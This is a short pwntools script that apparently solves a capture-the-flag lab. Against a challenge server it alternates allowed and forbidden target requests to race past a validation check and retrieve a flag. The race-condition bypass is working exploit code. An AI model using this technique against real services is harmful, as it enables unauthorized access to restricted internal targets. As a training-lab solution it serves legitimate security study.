import random
import os
import time
from pwn import *


HOST = "up.zoolab.org"
PORT = 10932
TRICK = b'up.zoolab.org/10000'
LEGAL_TARGET = b'localhost/10000'


if __name__ == "__main__":
  conn = remote(HOST, PORT)
  cnt = 0
  # print the banner
  while True:
    recv = conn.recv(timeout=1).decode("utf-8")
    if not recv:
      break
    print(recv, end="")
  while True:
    cnt+=1  # record the number of attempts
    rand = random.randint(0, 1)  # choose to send a legal or illegal target
    if rand == 0:
      conn.sendline(b'g')
      # conn.sendline(b'example.com/10000')
      # conn.sendline(b'google.com/80')
      conn.sendline(TRICK)
      conn.sendline(b'v')
    else:
      conn.sendline(b'g')
      conn.sendline(LEGAL_TARGET)
      conn.sendline(b'v')
    # send 'v' to check the status
    # conn.sendline(b'v')
    recv = conn.recvuntil(b"==== Menu ====\n", drop=False).decode('utf-8')
    print(recv)
    if 'FLAG{' in recv:
      flag = recv
      break

  start = flag.find('FLAG{')
  end = flag.find('}', start)
  if start != -1 and end != -1:
    flag = flag[start:end + 1]
  print("---------------------------------------------")
  print(f"{cnt}: I got {flag}")
  print("---------------------------------------------")
  # conn.interactive()
  conn.close()